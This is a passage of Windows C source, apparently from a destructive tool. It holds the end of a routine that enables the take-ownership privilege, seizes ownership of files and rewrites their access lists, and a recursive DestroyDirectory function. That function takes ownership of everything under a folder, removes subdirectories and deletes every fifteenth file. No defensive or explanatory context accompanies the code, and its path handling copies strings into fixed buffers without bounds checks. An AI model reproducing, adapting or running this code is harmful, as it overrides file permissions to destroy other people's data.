    EXPLICIT_ACCESS ea[NUM_ACES];
    DWORD dwRes;

    if (!AllocateAndInitializeSid(&SIDAuthWorld, 1, SECURITY_WORLD_RID, 0, 0, 0, 0, 0, 0, 0, &pSIDEveryone))
    {
        return false;
    }

    if (!AllocateAndInitializeSid(&SIDAuthNT, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &pSIDAdmin))
    {
        return false;
    }

    ZeroMemory(&ea, NUM_ACES * sizeof(EXPLICIT_ACCESS));

    ea[0].grfAccessPermissions = GENERIC_READ;
    ea[0].grfAccessMode = SET_ACCESS;
    ea[0].grfInheritance = NO_INHERITANCE;
    ea[0].Trustee.TrusteeForm = TRUSTEE_IS_SID;
    ea[0].Trustee.TrusteeType = TRUSTEE_IS_WELL_KNOWN_GROUP;
    ea[0].Trustee.ptstrName = (LPTSTR)pSIDEveryone;

    ea[1].grfAccessPermissions = GENERIC_ALL;
    ea[1].grfAccessMode = SET_ACCESS;
    ea[1].grfInheritance = NO_INHERITANCE;
    ea[1].Trustee.TrusteeForm = TRUSTEE_IS_SID;
    ea[1].Trustee.TrusteeType = TRUSTEE_IS_GROUP;
    ea[1].Trustee.ptstrName = (LPTSTR)pSIDAdmin;

    if (ERROR_SUCCESS != SetEntriesInAcl(NUM_ACES, ea, NULL, &pACL))
    {
        return false;
    }

    dwRes = SetNamedSecurityInfo((LPWSTR)lpszOwnFile, SE_FILE_OBJECT, DACL_SECURITY_INFORMATION, NULL, NULL, pACL, NULL);

    if (ERROR_SUCCESS == dwRes)
    {
        return true;
    }

    if (dwRes != ERROR_ACCESS_DENIED)
    {
        return false;
    }

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken))
    {
        return false;
    }

    if (!SetPrivilege(hToken, SE_TAKE_OWNERSHIP_NAME, true))
    {
        CloseHandle(hToken);
        return false;
    }

    dwRes = SetNamedSecurityInfo((LPWSTR)lpszOwnFile, SE_FILE_OBJECT, OWNER_SECURITY_INFORMATION, pSIDAdmin, NULL, NULL, NULL);

    if (dwRes != ERROR_SUCCESS)
    {
        SetPrivilege(hToken, SE_TAKE_OWNERSHIP_NAME, false);
        CloseHandle(hToken);
        return false;
    }

    dwRes = SetNamedSecurityInfo((LPWSTR)lpszOwnFile, SE_FILE_OBJECT, DACL_SECURITY_INFORMATION, NULL, NULL, pACL, NULL);

    if (dwRes != ERROR_SUCCESS)
    {
        SetPrivilege(hToken, SE_TAKE_OWNERSHIP_NAME, false);
        CloseHandle(hToken);
        return false;
    }

    SetPrivilege(hToken, SE_TAKE_OWNERSHIP_NAME, false);
    CloseHandle(hToken);
    return true;
}
void DestroyDirectory(LPWSTR Directory) {
    // Take ownership of the directory and its contents
    TakeOwnership(Directory);

    // Append a backslash if necessary
    if (Directory[wcslen(Directory) - 1] != '\\' && wcslen(Directory) < 260) {
        lstrcat(Directory, L"\\");
    }

    // Construct the search path
    WCHAR SearchDir[MAX_PATH] = { 0 };
    lstrcpy(SearchDir, Directory);
    lstrcat(SearchDir, L"*.*");

    // Find the first file in the directory
    WIN32_FIND_DATA findData;
    HANDLE hSearch = FindFirstFile(SearchDir, &findData);

    // If no files were found, return
    if (hSearch == INVALID_HANDLE_VALUE) {
        return;
    }

    // Iterate over each file in the directory
    else do {
        // Ignore the "." and ".." directories and symbolic links
        if (!lstrcmp(findData.cFileName, L".") || !lstrcmp(findData.cFileName, L"..") || findData.dwFileAttributes & FILE_ATTRIBUTE_REPARSE_POINT) {
            continue;
        }

        // Construct the full path to the file
        WCHAR Path[MAX_PATH] = { 0 };
        lstrcpy(Path, Directory);
        lstrcat(Path, findData.cFileName);

        // Increment the file count
        if (FileNum < LLONG_MAX) {
            FileNum++;
        }

        // If the file is a directory, recursively delete its contents and the directory itself
        if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            lstrcat(Path, L"\\");
            DestroyDirectory(Path);
            RemoveDirectory(Path);
        }
        // If the file is a regular file, take ownership and delete it
        else if (TakeOwnership(Path) && !(FileNum % 15)) {
            DeleteFile(Path);
        }
    } while (FindNextFile(hSearch, &findData));

    // Close the search handle
    FindClose(hSearch);
}
